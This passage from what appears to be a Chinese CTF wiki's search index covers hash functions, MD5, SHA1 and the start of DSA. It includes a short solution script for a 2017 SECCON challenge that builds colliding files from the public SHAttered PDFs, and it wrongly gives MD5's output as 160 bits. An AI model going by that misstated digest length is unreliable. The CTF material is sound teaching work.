Software_update"},{"location":"crypto/hash/complex/#_2","text":"https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/hash/introduction/","text":"\u54c8\u5e0c\u51fd\u6570 \u00b6 \u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\u628a\u6d88\u606f\u6216\u6570\u636e\u538b\u7f29\u6210\u6458\u8981\uff0c\u4f7f\u5f97\u6570\u636e\u91cf\u53d8\u5c0f\u3002\u5176\u4e00\u822c\u6a21\u578b\u5982\u4e0b \u663e\u7136\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2ahash\u503c\uff0c\u7406\u8bba\u4e0a\u5b58\u5728\u82e5\u5e72\u4e2a\u6d88\u606f\u4e0e\u4e4b\u5bf9\u5e94\uff0c\u5373\u78b0\u649e\u3002 \u54c8\u5e0c\u51fd\u6570\u7684\u57fa\u672c\u9700\u6c42\u5982\u4e0b \u9700\u6c42 \u63cf\u8ff0 \u8f93\u5165\u957f\u5ea6\u53ef\u53d8 hash\u51fd\u6570\u53ef\u4ee5\u5e94\u7528\u4e8e\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e \u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a hash\u51fd\u6570\u7684\u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a \u6548\u7387 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606f x x \uff0c\u8ba1\u7b97 H(x) H(x) \u5f88\u5bb9\u6613 \u5355\u5411\u6027 \u5bf9\u4e8e\u4efb\u610f\u54c8\u5e0c\u503ch\uff0c\u60f3\u8981\u627e\u5230\u6ee1\u8db3 H(x)=h H(x)=h \u7684x\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f31\u78b0\u649e\u6027 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606fx\uff0c\u627e\u5230\u6ee1\u8db3\u53e6\u4e00\u6d88\u606fy\uff0c\u6ee1\u8db3 H(x)=H(y) H(x)=H(y) \uff0c\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f3a\u78b0\u649e\u6027 \u627e\u5230\u4efb\u610f\u4e00\u5bf9\u6ee1\u8db3 H(x)=H(y) H(x)=H(y) \u7684\u6d88\u606fx\u548cy\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u4f2a\u968f\u673a\u6027 \u54c8\u5e0c\u51fd\u6570\u7684\u8f93\u51fa\u6ee1\u8db3\u4f2a\u968f\u673a\u6027\u6d4b\u8bd5\u6807\u51c6\u3002 \u6563\u5217\u503c\u7684\u76ee\u7684\u5982\u4e0b \u786e\u4fdd\u6d88\u606f\u7684\u5b8c\u6574\u6027\uff0c\u5373\u786e\u4fdd\u6536\u5230\u7684\u6570\u636e\u786e\u5b9e\u548c\u53d1\u9001\u65f6\u7684\u4e00\u6837\uff08\u5373\u6ca1\u6709\u4fee\u6539\u3001\u63d2\u5165\u3001\u5220\u9664\u6216\u91cd\u653e\uff09\uff0c\u9632\u6b62\u4e2d\u95f4\u4eba\u7be1\u6539\u3002 \u5197\u4f59\u6821\u9a8c \u5355\u5411\u53e3\u4ee4\u6587\u4ef6\uff0c\u6bd4\u5982linux\u7cfb\u7edf\u7684\u5bc6\u7801 \u5165\u4fb5\u68c0\u6d4b\u548c\u75c5\u6bd2\u68c0\u6d4b\u4e2d\u7684\u7279\u5f81\u7801\u68c0\u6d4b \u76ee\u524d\u7684Hash\u51fd\u6570\u4e3b\u8981\u6709MD5\uff0cSHA1\uff0cSHA256\uff0cSHA512\u3002\u76ee\u524d\u7684\u5927\u591a\u6570hash\u51fd\u6570\u90fd\u662f\u8fed\u4ee3\u6027\u7684\uff0c\u5373\u4f7f\u7528\u540c\u4e00\u4e2ahash\u51fd\u6570\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u8fdb\u884c\u591a\u6b21\u8fed\u4ee3\u8fd0\u7b97\u3002 \u7b97\u6cd5\u7c7b\u578b \u8f93\u51fa Hash \u503c\u957f\u5ea6 MD5 128 bit / 256 bit SHA1 160 bit SHA256 256 bit SHA512 512 bit","title":"\u54c8\u5e0c\u51fd\u6570\u7b80\u4ecb"},{"location":"crypto/hash/introduction/#_1","text":"\u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\u628a\u6d88\u606f\u6216\u6570\u636e\u538b\u7f29\u6210\u6458\u8981\uff0c\u4f7f\u5f97\u6570\u636e\u91cf\u53d8\u5c0f\u3002\u5176\u4e00\u822c\u6a21\u578b\u5982\u4e0b \u663e\u7136\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2ahash\u503c\uff0c\u7406\u8bba\u4e0a\u5b58\u5728\u82e5\u5e72\u4e2a\u6d88\u606f\u4e0e\u4e4b\u5bf9\u5e94\uff0c\u5373\u78b0\u649e\u3002 \u54c8\u5e0c\u51fd\u6570\u7684\u57fa\u672c\u9700\u6c42\u5982\u4e0b \u9700\u6c42 \u63cf\u8ff0 \u8f93\u5165\u957f\u5ea6\u53ef\u53d8 hash\u51fd\u6570\u53ef\u4ee5\u5e94\u7528\u4e8e\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e \u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a hash\u51fd\u6570\u7684\u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a \u6548\u7387 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606f x x \uff0c\u8ba1\u7b97 H(x) H(x) \u5f88\u5bb9\u6613 \u5355\u5411\u6027 \u5bf9\u4e8e\u4efb\u610f\u54c8\u5e0c\u503ch\uff0c\u60f3\u8981\u627e\u5230\u6ee1\u8db3 H(x)=h H(x)=h \u7684x\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f31\u78b0\u649e\u6027 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606fx\uff0c\u627e\u5230\u6ee1\u8db3\u53e6\u4e00\u6d88\u606fy\uff0c\u6ee1\u8db3 H(x)=H(y) H(x)=H(y) \uff0c\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f3a\u78b0\u649e\u6027 \u627e\u5230\u4efb\u610f\u4e00\u5bf9\u6ee1\u8db3 H(x)=H(y) H(x)=H(y) \u7684\u6d88\u606fx\u548cy\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u4f2a\u968f\u673a\u6027 \u54c8\u5e0c\u51fd\u6570\u7684\u8f93\u51fa\u6ee1\u8db3\u4f2a\u968f\u673a\u6027\u6d4b\u8bd5\u6807\u51c6\u3002 \u6563\u5217\u503c\u7684\u76ee\u7684\u5982\u4e0b \u786e\u4fdd\u6d88\u606f\u7684\u5b8c\u6574\u6027\uff0c\u5373\u786e\u4fdd\u6536\u5230\u7684\u6570\u636e\u786e\u5b9e\u548c\u53d1\u9001\u65f6\u7684\u4e00\u6837\uff08\u5373\u6ca1\u6709\u4fee\u6539\u3001\u63d2\u5165\u3001\u5220\u9664\u6216\u91cd\u653e\uff09\uff0c\u9632\u6b62\u4e2d\u95f4\u4eba\u7be1\u6539\u3002 \u5197\u4f59\u6821\u9a8c \u5355\u5411\u53e3\u4ee4\u6587\u4ef6\uff0c\u6bd4\u5982linux\u7cfb\u7edf\u7684\u5bc6\u7801 \u5165\u4fb5\u68c0\u6d4b\u548c\u75c5\u6bd2\u68c0\u6d4b\u4e2d\u7684\u7279\u5f81\u7801\u68c0\u6d4b \u76ee\u524d\u7684Hash\u51fd\u6570\u4e3b\u8981\u6709MD5\uff0cSHA1\uff0cSHA256\uff0cSHA512\u3002\u76ee\u524d\u7684\u5927\u591a\u6570hash\u51fd\u6570\u90fd\u662f\u8fed\u4ee3\u6027\u7684\uff0c\u5373\u4f7f\u7528\u540c\u4e00\u4e2ahash\u51fd\u6570\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u8fdb\u884c\u591a\u6b21\u8fed\u4ee3\u8fd0\u7b97\u3002 \u7b97\u6cd5\u7c7b\u578b \u8f93\u51fa Hash \u503c\u957f\u5ea6 MD5 128 bit / 256 bit SHA1 160 bit SHA256 256 bit SHA512 512 bit","title":"\u54c8\u5e0c\u51fd\u6570"},{"location":"crypto/hash/md5/","text":"MD5 \u00b6 \u57fa\u672c\u63cf\u8ff0 \u00b6 MD5\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c512\u6bd4\u7279\u957f\u7684\u5206\u7ec4\u3002 \u8f93\u51fa\uff1a160\u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002 \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002 \u6b64\u5916\uff0c\u6709\u65f6\u5019\u6211\u4eec\u83b7\u5f97\u5230\u7684md5\u662f16\u4f4d\u7684\uff0c\u5176\u5b9e\u90a316\u4f4d\u662f32\u4f4dmd5\u7684\u957f\u5ea6\uff0c\u662f\u4ece32\u4f4dmd5\u503c\u6765\u7684\u3002\u662f\u5c0632\u4f4dmd5\u53bb\u6389\u524d\u516b\u4f4d\uff0c\u53bb\u6389\u540e\u516b\u4f4d\u5f97\u5230\u7684\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662fMD5\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u56db\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3aMD5\u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662fMD5\u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002 0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476 \u7834\u89e3 \u00b6 \u76ee\u524d\u53ef\u4ee5\u8bf4md5\u5df2\u7ecf\u57fa\u672c\u88ab\u653b\u7834\u4e86\uff0c\u4e00\u822c\u7684MD5\u7684\u78b0\u649e\u90fd\u53ef\u4ee5\u5728\u5982\u4e0b\u7f51\u4e0a\u83b7\u53d6\u5230 http://www.cmd5.com/ http://www.ttmd5.com/ http://pmd5.com/ \u9898\u76ee \u00b6 CFF 2016 \u597d\u591a\u76d0 JarvisOJ \u597d\u591a\u76d0","title":"MD5"},{"location":"crypto/hash/md5/#md5","text":"","title":"MD5"},{"location":"crypto/hash/md5/#_1","text":"MD5\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c512\u6bd4\u7279\u957f\u7684\u5206\u7ec4\u3002 \u8f93\u51fa\uff1a160\u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002 \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002 \u6b64\u5916\uff0c\u6709\u65f6\u5019\u6211\u4eec\u83b7\u5f97\u5230\u7684md5\u662f16\u4f4d\u7684\uff0c\u5176\u5b9e\u90a316\u4f4d\u662f32\u4f4dmd5\u7684\u957f\u5ea6\uff0c\u662f\u4ece32\u4f4dmd5\u503c\u6765\u7684\u3002\u662f\u5c0632\u4f4dmd5\u53bb\u6389\u524d\u516b\u4f4d\uff0c\u53bb\u6389\u540e\u516b\u4f4d\u5f97\u5230\u7684\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662fMD5\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u56db\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3aMD5\u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662fMD5\u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002 0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476","title":"\u57fa\u672c\u63cf\u8ff0"},{"location":"crypto/hash/md5/#_2","text":"\u76ee\u524d\u53ef\u4ee5\u8bf4md5\u5df2\u7ecf\u57fa\u672c\u88ab\u653b\u7834\u4e86\uff0c\u4e00\u822c\u7684MD5\u7684\u78b0\u649e\u90fd\u53ef\u4ee5\u5728\u5982\u4e0b\u7f51\u4e0a\u83b7\u53d6\u5230 http://www.cmd5.com/ http://www.ttmd5.com/ http://pmd5.com/","title":"\u7834\u89e3"},{"location":"crypto/hash/md5/#_3","text":"CFF 2016 \u597d\u591a\u76d0 JarvisOJ \u597d\u591a\u76d0","title":"\u9898\u76ee"},{"location":"crypto/hash/sha1/","text":"SHA1 \u00b6 \u57fa\u672c\u63cf\u8ff0 \u00b6 SHA1\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c\u5206\u4e3a 512 \u6bd4\u7279 \u957f\u7684\u5206\u7ec4\u3002\u9996\u5148\u5728\u6d88\u606f\u53f3\u4fa7\u8865\u6bd4\u7279 1\uff0c\u7136\u540e\u518d\u8865\u82e5\u5e72\u4e2a\u6bd4\u7279 0\uff0c\u76f4\u5230\u6d88\u606f\u7684\u6bd4\u7279\u957f\u5ea6\u6ee1\u8db3\u5bf9 512 \u53d6\u6a21\u540e\u4f59\u6570\u662f 448\uff0c\u4f7f\u5176\u4e0e 448 \u6a21 512 \u540c\u4f59\u3002 \u8f93\u51fa\uff1a160 \u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002 \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662f SHA1 \u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u4e94\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3a SHA1 \u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662f SHA1 \u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002 0x67452301 0xEFCDAB89 0x98BADCFE 0x10325476 0xC3D2E1F0 \u524d\u9762\u56db\u4e2a\u4e0e MD5 \u7c7b\u4f3c\uff0c\u540e\u9762\u7684\u662f\u65b0\u52a0\u7684\u3002 \u7834\u89e3 \u00b6 \u5c31\u76ee\u524d\u800c\u8a00\uff0cSHA1 \u5df2\u7ecf\u4e0d\u518d\u5b89\u5168\u4e86\uff0c\u56e0\u4e3a\u4e4b\u524d\u8c37\u6b4c\u516c\u5e03\u4e86\u6c42\u5f97\u4e24\u4e2a sha1 \u503c\u4e00\u6837\u7684 pdf\uff0c\u5177\u4f53\u8bf7\u53c2\u8003 shattered \u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u7f51\u7ad9\uff1a https://alf.nu/SHA1 \u3002 2017 SECCON SHA1 is dead \u00b6 \u9898\u76ee\u63cf\u8ff0\u5982\u4e0b file1 != file2 SHA1(file1) == SHA1(file2) SHA256(file1) <> SHA256(file2) 2017KiB < sizeof(file1) < 2018KiB 2017KiB < sizeof(file2) < 2018KiB \u5176\u4e2d 1KiB = 1024 bytes \u5373\u6211\u4eec\u9700\u8981\u627e\u5230\u4e24\u4e2a\u6587\u4ef6\u6ee1\u8db3\u4e0a\u8ff0\u7684\u7ea6\u675f\u3002 \u8fd9\u91cc\u7acb\u9a6c\u5c31\u60f3\u5230\u8c37\u6b4c\u4e4b\u524d\u516c\u5e03\u7684\u6587\u6863\uff0c\u800c\u4e14\uff0c\u975e\u5e38\u91cd\u8981\u7684\u662f\uff0c\u53ea\u8981\u4f7f\u7528\u7ed9\u5b9a\u7684\u524d 320 \u5b57\u8282\uff0c\u540e\u9762\u4efb\u610f\u6dfb\u52a0\u4e00\u6837\u7684\u5b57\u8282\u83b7\u53d6\u7684\u54c8\u5e0c\u4ecd\u7136\u4e00\u6837\uff0c\u8fd9\u91cc\u6211\u4eec\u6d4b\u8bd5\u5982\u4e0b \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-1.pdf | sha1sum \u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165 \u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320 bytes copied, 0 .00796817 s, 40 .2 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-2.pdf | sha1sum \u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165 \u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320 bytes copied, 0 .00397215 s, 80 .6 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u8fdb\u800c\u6211\u4eec\u76f4\u63a5\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u5982\u4e0b from hashlib import sha1 from hashlib import sha256 pdf1 = open ( './shattered-1.pdf' ) . read ( 320 ) pdf2 = open ( './shattered-2.pdf' ) . read ( 320 ) pdf1 = pdf1 . ljust ( 2017 * 1024 + 1 - 320 , \" \\00 \" ) #padding pdf to 2017Kib + 1 pdf2 = pdf2 . ljust ( 2017 * 1024 + 1 - 320 , \" \\00 \" ) open ( \"upload1\" , \"w\" ) . write ( pdf1 ) open ( \"upload2\" , \"w\" ) . write ( pdf2 ) print sha1 ( pdf1 ) . hexdigest () print sha1 ( pdf2 ) . hexdigest () print sha256 ( pdf1 ) . hexdigest () print sha256 ( pdf2 ) . hexdigest () \u53c2\u8003\u6587\u732e \u00b6 https://www.slideshare.net/herumi/googlesha1","title":"SHA1"},{"location":"crypto/hash/sha1/#sha1","text":"","title":"SHA1"},{"location":"crypto/hash/sha1/#_1","text":"SHA1\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c\u5206\u4e3a 512 \u6bd4\u7279 \u957f\u7684\u5206\u7ec4\u3002\u9996\u5148\u5728\u6d88\u606f\u53f3\u4fa7\u8865\u6bd4\u7279 1\uff0c\u7136\u540e\u518d\u8865\u82e5\u5e72\u4e2a\u6bd4\u7279 0\uff0c\u76f4\u5230\u6d88\u606f\u7684\u6bd4\u7279\u957f\u5ea6\u6ee1\u8db3\u5bf9 512 \u53d6\u6a21\u540e\u4f59\u6570\u662f 448\uff0c\u4f7f\u5176\u4e0e 448 \u6a21 512 \u540c\u4f59\u3002 \u8f93\u51fa\uff1a160 \u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002 \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662f SHA1 \u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u4e94\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3a SHA1 \u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662f SHA1 \u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002 0x67452301 0xEFCDAB89 0x98BADCFE 0x10325476 0xC3D2E1F0 \u524d\u9762\u56db\u4e2a\u4e0e MD5 \u7c7b\u4f3c\uff0c\u540e\u9762\u7684\u662f\u65b0\u52a0\u7684\u3002","title":"\u57fa\u672c\u63cf\u8ff0"},{"location":"crypto/hash/sha1/#_2","text":"\u5c31\u76ee\u524d\u800c\u8a00\uff0cSHA1 \u5df2\u7ecf\u4e0d\u518d\u5b89\u5168\u4e86\uff0c\u56e0\u4e3a\u4e4b\u524d\u8c37\u6b4c\u516c\u5e03\u4e86\u6c42\u5f97\u4e24\u4e2a sha1 \u503c\u4e00\u6837\u7684 pdf\uff0c\u5177\u4f53\u8bf7\u53c2\u8003 shattered \u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u7f51\u7ad9\uff1a https://alf.nu/SHA1 \u3002","title":"\u7834\u89e3"},{"location":"crypto/hash/sha1/#2017-seccon-sha1-is-dead","text":"\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b file1 != file2 SHA1(file1) == SHA1(file2) SHA256(file1) <> SHA256(file2) 2017KiB < sizeof(file1) < 2018KiB 2017KiB < sizeof(file2) < 2018KiB \u5176\u4e2d 1KiB = 1024 bytes \u5373\u6211\u4eec\u9700\u8981\u627e\u5230\u4e24\u4e2a\u6587\u4ef6\u6ee1\u8db3\u4e0a\u8ff0\u7684\u7ea6\u675f\u3002 \u8fd9\u91cc\u7acb\u9a6c\u5c31\u60f3\u5230\u8c37\u6b4c\u4e4b\u524d\u516c\u5e03\u7684\u6587\u6863\uff0c\u800c\u4e14\uff0c\u975e\u5e38\u91cd\u8981\u7684\u662f\uff0c\u53ea\u8981\u4f7f\u7528\u7ed9\u5b9a\u7684\u524d 320 \u5b57\u8282\uff0c\u540e\u9762\u4efb\u610f\u6dfb\u52a0\u4e00\u6837\u7684\u5b57\u8282\u83b7\u53d6\u7684\u54c8\u5e0c\u4ecd\u7136\u4e00\u6837\uff0c\u8fd9\u91cc\u6211\u4eec\u6d4b\u8bd5\u5982\u4e0b \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-1.pdf | sha1sum \u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165 \u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320 bytes copied, 0 .00796817 s, 40 .2 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-2.pdf | sha1sum \u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165 \u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320 bytes copied, 0 .00397215 s, 80 .6 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u8fdb\u800c\u6211\u4eec\u76f4\u63a5\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u5982\u4e0b from hashlib import sha1 from hashlib import sha256 pdf1 = open ( './shattered-1.pdf' ) . read ( 320 ) pdf2 = open ( './shattered-2.pdf' ) . read ( 320 ) pdf1 = pdf1 . ljust ( 2017 * 1024 + 1 - 320 , \" \\00 \" ) #padding pdf to 2017Kib + 1 pdf2 = pdf2 . ljust ( 2017 * 1024 + 1 - 320 , \" \\00 \" ) open ( \"upload1\" , \"w\" ) . write ( pdf1 ) open ( \"upload2\" , \"w\" ) . write ( pdf2 ) print sha1 ( pdf1 ) . hexdigest () print sha1 ( pdf2 ) . hexdigest () print sha256 ( pdf1 ) . hexdigest () print sha256 ( pdf2 ) . hexdigest ()","title":"2017 SECCON SHA1 is dead"},{"location":"crypto/hash/sha1/#_3","text":"https://www.slideshare.net/herumi/googlesha1","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/signature/dsa/","text":"DSA \u00b6 \u4e0a\u9762\u6240\u63cf\u8ff0\u7684ElGamal\u7b7e\u540d\u7b97\u6cd5\u5728\u5b9e\u9645\u4e2d\u5e76\u4e0d\u5e38\u7528\uff0c\u66f4\u5e38\u7528\u7684\u662f\u5176\u53d8\u4f53DSA\u3002 \u57fa\u672c\u539f\u7406 \u00b6 \u5bc6\u94a5\u751f\u6210 \u00b6 \u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u76ee\u524d\u4e00\u822c\u9009\u62e9SHA1\uff0c\u5f53\u524d\u4e5f\u53ef\u4ee5\u9009\u62e9\u5f3a\u5ea6\u66f4\u9ad8\u7684\u54c8\u5e0c\u51fd\u6570H\u3002 \u9009\u62e9\u5bc6\u94a5\u7684\u957f\u5ea6L\u548cN\uff0c\u8fd9\u4e24\u4e2a\u503c\u51b3\u5b9a\u4e86\u7b7e\u540d\u7684\u5b89\u5168\u7a0b\u5ea6\u3002\u5728\u6700\u521d\u7684DSS\uff08 Digital Signature Standard \uff09\u4e2d\u5efa\u8baeL\u5fc5\u987b\u4e3a64\u7684\u500d\u6570\uff0c\u5e76\u4e14 512 \\leq L \\leq 1024 512 \\leq L \\leq 1024 \uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u66f4\u5927\u3002N\u5fc5\u987b\u5927\u5c0f\u5fc5\u987b\u4e0d\u5927\u4e8e\u54c8\u5e0c\u51fd\u6570H\u8f93\u51fa\u7684\u957f\u5ea6\u3002FIPS 186-3\u7ed9\u51fa\u4e86\u4e00\u4e9b\u5efa\u8bae\u7684L\u548cN\u7684\u53d6\u503c\u4f8b\u5b50\uff1a(1024, 160)\uff0c (2048, 224)\uff0c (2048, 256)\uff0c\u4ee5\u53ca (3,072, 256)\u3002 \u9009\u62e9N\u6bd4\u7279\u7684\u7d20\u6570q\u3002 \u9009\u62e9L\u6bd4\u7279\u7684\u7d20\u6570p\uff0c\u4f7f\u5f97p-1\u662fq\u7684\u500d\u6570\u3002 \u9009\u62e9\u6ee1\u8db3 g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u7684g\uff0c\u5373\u5728\u6a21p\u7684\u80cc\u666f\u4e0b\uff0cord(g)=q\u7684g\u3002\u5373g\u5728\u6a21p\u7684\u610f\u4e49\u4e0b\uff0c\u5176\u6307\u6570\u6b21\u5e42\u53ef\u4ee5\u751f\u6210\u5177\u6709q\u4e2a\u5143\u7d20\u7684\u5b50\u7fa4\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97 g=h^{\\frac{p-1}{q}} \\bmod p g=h^{\\frac{p-1}{q}} \\bmod p \u6765\u5f97\u5230g\uff0c\u5176\u4e2d 1< h < p-1 1< h < p-1 \u3002 \u9009\u62e9\u79c1\u94a5x\uff0c 0<x<q 0<x<q \uff0c\u8ba1\u7b97 y \\equiv g^x \\bmod p y \\equiv g^x \\bmod p \u3002 \u516c\u94a5\u4e3a(p,q,g,y)\uff0c\u79c1\u94a5\u4e3a(x)\u3002 \u7b7e\u540d \u00b6 \u7b7e\u540d\u6b65\u9aa4\u5982\u4e0b \u9009\u62e9\u968f\u673a\u6574\u6570\u6570k\u4f5c\u4e3a\u4e34\u65f6\u5bc6\u94a5\uff0c 0<k<q 0<k<q \u3002 \u8ba1\u7b97 r\\equiv (g^k \\bmod p) \\bmod q r\\equiv (g^k \\bmod p) \\bmod q \u8ba1\u7b97 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u7b7e\u540d\u7ed3\u679c\u4e3a(r,s)\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u4e0eElgamal\u5f88\u91cd\u8981\u7684\u4e0d\u540c\u662f\u8fd9\u91cc\u4f7f\u7528\u4e86\u54c8\u5e0c\u51fd\u6570\u5bf9\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u5904\u7406\u3002 \u9a8c\u8bc1 \u00b6 \u9a8c\u8bc1\u8fc7\u7a0b\u5982\u4e0b \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c w=s^{-1} \\bmod q w=s^{-1} \\bmod q \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_1=H(m)w \\bmod q u_1=H(m)w \\bmod q \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_2=rw \\bmod q u_2=rw \\bmod q \u8ba1\u7b97 v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q \u5982\u679cv\u4e0er\u76f8\u7b49\uff0c\u5219\u6821\u9a8c\u6210\u529f\u3002 \u6b63\u786e\u6027\u63a8\u5bfc \u00b6 \u9996\u5148\uff0cg \u6ee1\u8db3 g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u3002\u6240\u4ee5 g^q \\equiv 1 \\bmod p g^q \\equiv 1 \\bmod p \u3002\u6240\u4ee5 g^x \\equiv g^{x \\bmod q} \\bmod p g^x \\equiv g^{x \\bmod q} \\bmod p \u3002\u8fdb\u800c v=(g^{u_1}y^{u_2} \\bmod p) \\bmod 